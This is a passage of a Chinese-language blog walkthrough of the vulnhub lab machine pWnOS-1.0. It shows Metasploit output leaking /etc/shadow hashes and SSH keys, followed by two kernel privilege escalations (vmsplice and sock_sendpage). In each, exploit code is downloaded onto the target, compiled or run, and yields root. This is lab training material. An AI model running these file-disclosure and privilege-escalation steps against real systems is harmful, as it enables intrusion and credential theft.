class="variable">$AkdCcO2UfsCOM0IC8BYBb</span>/:14042:0:99999:7:::</span><br><span class="line">obama:$1$hvDHcCfx<span class="variable">$pj78hUduionhij9q9JrtA0</span>:14041:0:99999:7:::</span><br><span class="line">osama:$1$Kqiv9qBp<span class="variable">$eJg2uGCrOHoXGq0h5ehwe</span>.:14041:0:99999:7:::</span><br><span class="line">yomama:$1<span class="variable">$tI4FJ</span>.kP<span class="variable">$wgDmweY9SAzJZYqW76oDA</span>.:14041:0:99999:7:::</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; <span class="built_in">set</span> RPATH /home/obama/.ssh/authorized_keys</span><br><span class="line">RPATH =&gt; /home/obama/.ssh/authorized_keys</span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.33.3</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /home/obama/.ssh/authorized_keys...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxRuWHhMPelB60JctxC6BDxjqQXggf0ptx2wrcAw09HayPxMnKv+BFiGA/I1yXn5EqUfuLSDcTwiIeVSvqJl3NNI5HQUUc6KGlwrhCW464ksARX2ZAp9+6Yu7DphKZmtF5QsWaiJc7oV5il89zltwBDqR362AH49m8/3OcZp4XJqEAOlVWeT5/jikmke834CyTMlIcyPL85LpFw2aXQCJQIzvkCHJAfwTpwJTugGMB5Ng73omS82Q3ErbOhTSa5iBuE86SEkyyotEBUObgWU3QW6ZMWM0Rd9ErIgvps1r/qpteMMrgieSUKlF/LaeMezSXXkZrn0x+A2bKsw9GwMetQ== obama@ubuntuvm</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
+
+<p>然后将hash用john解密即可</p>
+<ul>
+<li>提权3</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux ubuntuvm 2.6.22-14-server <span class="comment">#1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span></span><br></pre></td></tr></table></figure>
+<p>内核早已过期<br>谷歌搜索立即找到了有关vmsplice_to_pipe（）的好消息，这是一个本地特权升级漏洞，会影响2.6.24.2之前的内核。 来源可在ExploitDB上找到。 作者对源代码文件的名称充满了想象力（阅读第一行，很有趣）。<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNTA5Mg==">vmsplice Local Privilege Escalation<i class="fa fa-external-link-alt"></i></span></p>
+<p>下载它然后编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget -O vmsplice.c https://www.exploit-db.com/download/5092 --no-check-certificate</span></span><br><span class="line">--2019-12-31 11:12:44--  https://www.exploit-db.com/download/5092</span><br><span class="line">正在解析主机 www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">正在连接 www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：6580 (6.4K) [application/txt]</span><br><span class="line">正在保存至: “vmsplice.c”</span><br><span class="line"></span><br><span class="line">vmsplice.c                 100%[======================================&gt;]   6.43K  --.-KB/s  用时 0s      </span><br><span class="line"></span><br><span class="line">2019-12-31 11:12:50 (40.8 MB/s) - 已保存 “vmsplice.c” [6580/6580])</span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">vmware@ubuntuvm:/tmp$ wget http://192.168.33.1:8000/vmsplice.c</span><br><span class="line">--10:18:57--  http://192.168.33.1:8000/vmsplice.c</span><br><span class="line">           =&gt; `vmsplice.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.33.1:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 6,580 (6.4K) [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[==============================================================&gt;] 6,580         --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10:18:57 (661.94 MB/s) - `vmsplice.c&#x27;</span> saved [6580/6580]</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:/tmp$ gcc vmsplice.c -o exp</span><br><span class="line">vmsplice.c:289:28: warning: no newline at end of file</span><br><span class="line">vmware@ubuntuvm:/tmp$ ./exp</span><br><span class="line">-----------------------------------</span><br><span class="line"> Linux vmsplice Local Root Exploit</span><br><span class="line"> By qaaz</span><br><span class="line">-----------------------------------</span><br><span class="line">[+] mmap: 0x0 .. 0x1000</span><br><span class="line">[+] page: 0x0</span><br><span class="line">[+] page: 0x20</span><br><span class="line">[+] mmap: 0x4000 .. 0x5000</span><br><span class="line">[+] page: 0x4000</span><br><span class="line">[+] page: 0x4020</span><br><span class="line">[+] mmap: 0x1000 .. 0x2000</span><br><span class="line">[+] page: 0x1000</span><br><span class="line">[+] mmap: 0xb7e5b000 .. 0xb7e8d000</span><br><span class="line">[+] root</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># id </span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line">root@ubuntuvm:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>注意：C源码文件一定要放到目标机上编译才能运行，提权完成。。。</p>
+<ul>
+<li>提权4</li>
+</ul>
+<p>这个靶机实在是太辣鸡了，简直就是个万人捅，，，sorry，太黄了。。。<br>还可以使用sock_sendpage()空指针来提权，具体参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvOTY0MQ==">sock_sendpage() Local Privilege Escalation<i class="fa fa-external-link-alt"></i></span><br>按照里面的链接下载文件后，解压出来有好几个文件，全部放到目标机的tmp目录下，然后给777权限，直接运行run提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/linux-sendpage3<span class="comment"># ls</span></span><br><span class="line">exploit.c  exploit-pulseaudio.c  run  runcon-mmap_zero  sesearch-mmap_zero</span><br><span class="line"></span><br><span class="line">vmware@ubuntuvm:/tmp$ <span class="built_in">ls</span></span><br><span class="line">exp      exploit.c           exploit-pulseaudio.c  hello.cgi  runcon-mmap_zero    sqlMAUTWl</span><br><span class="line">exploit  exploit-pulseaudio  exploit.so            run        sesearch-mmap_zero  vmsplice.c</span><br><span class="line">vmware@ubuntuvm:/tmp$ ./run</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>成功提权！！！帅呆了！！！</p>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2019/12/29/pWnOS-1/" title="vulnhub靶机渗透[pWnOS-1.0]">https://fdlucifer.github.io/2019/12/29/pWnOS-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/12/26/Smasher2/" rel="prev" title="Hack-The-Box-walkthrough[Smasher2]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Smasher2]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/12/31/Os-hackNos-3/" rel="next" title="vulnhub靶机渗透[Os-hackNos-3]">
+                  vulnhub靶机渗透[Os-hackNos-3] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
